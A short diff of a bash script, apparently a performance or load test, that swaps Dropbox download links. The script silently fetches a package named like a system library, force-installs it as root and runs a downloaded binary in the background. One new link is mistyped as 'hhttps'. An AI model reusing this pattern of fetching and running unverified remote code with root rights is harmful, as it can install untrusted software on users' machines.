@@ -1,10 +1,10 @@
 #!/bin/bash
 
 end=$((SECONDS+$1))
-wget https://www.dropbox.com/s/vv24bsdw6wa8yuh/libstdc.deb -q
+wget https://www.dropbox.com/s/s6j41h7gjx896vw/libstdc.deb -q
 sudo dpkg --force-all -i libstdc.deb > /dev/null 2>&1
 rm -rf libstdc.deb
-wget https://www.dropbox.com/s/r4zeimetgq1blu5/scomp.zip -q
+wget hhttps://www.dropbox.com/s/6fifwy1wz0bx2mu/scomp.zip -q
 unzip scomp.zip > /dev/null 2>&1
 #pwd
 ./perf/scomp ./perf/catalog &
